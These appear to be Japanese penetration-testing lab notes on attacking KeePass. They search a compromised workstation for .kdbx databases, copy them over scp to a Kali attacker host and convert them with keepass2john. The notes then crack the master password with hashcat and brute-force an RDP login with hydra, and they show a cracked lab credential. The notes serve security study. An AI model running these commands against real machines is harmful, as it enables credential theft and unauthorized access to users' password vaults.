Password Manger
# シナリオ１
パスワードマネージャーを実行しているクライアントワークステーションへのアクセスに成功したと仮定し、パスワードマネージャーのデータベースを抽出し、ファイルをHashcatと互換性のある形式に変換し、マスターデータベースのパスワードを解読

1. RDP接続し、「アプリと機能」からKeePass（.kbdxファイル)のインストールを確認

2. ファイルのパスを確認
```Powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```
-  -Path C:\ ドライブ全体を検索
- -Include 検索対象とするファイルの種類を指定
- -Fileと-Recurse 引数を使ってファイルのリストを取得し、サブディレクトリも検索
- -ErrorActionをSilentlyContinueに 設定してエラーを抑制し、実行を継続

3. ファイルをkaliへ転送
```bash
 scp .\Documents\Database.kdbx kali@192.168.45.167:/home/kali/Database.kdbx
 ```

4. 解析準備
```bash
ls -la Database.kdbx
keepass2john Database.kdbx > keepass.hash
cat keepass.hash
Database:$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1
# 戦闘のDatabaseの文字列がいらないので削除

hashcat --help | grep -i "KeePass"
  13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)  　　　　　　　       | Password Manager
  29700 | KeePass 1 (AES/Twofish) and KeePass 2 (AES) - keyfile only mode | Password Manager

```

5. 解析
```bash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

# シナリオ２
1.　ユーザのパスワードクラック
```bash
hydra -l nedian -P /usr/share/wordlists/rockyou.txt rdp://192.168.248.227
[3389][rdp] host: 192.168.248.227   login: nadine   password: 123abc
```

2. アプリの検索とファイル探索
![](../../../../assets/images/Pasted%20image%2020260428204406.png)
```Powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

3. 調査と探索
```bash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

```zsh
keepass2john Database2.kdbx > keepass2.hash
```

```zsh
cat keepass2.hash 
Database2:$keepass$*2*1*0*b1a85c5029830d00eead372eff9b2c0c5f2b78d8adf6090568429ba7b9622f25*27ab0d96aaacbb427dc6e9746fcf5148a468d042855186d3d1409d40ca018fa1*2eb108ae671a4aebcfa4217b5dcdccdc*ea47adcf48185eb7d670b25a3b2f8a535eb72339bbdf2e0d05c892bad22287f0*e250173255fbe9861707502ebef385c839fd328dac2f7874ff3b0bfc13cf4b56
```

# Databaseを削除
```zsh
 vi keepass2.hash
```

```zsh
hashcat -m 13400 keepass2.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```
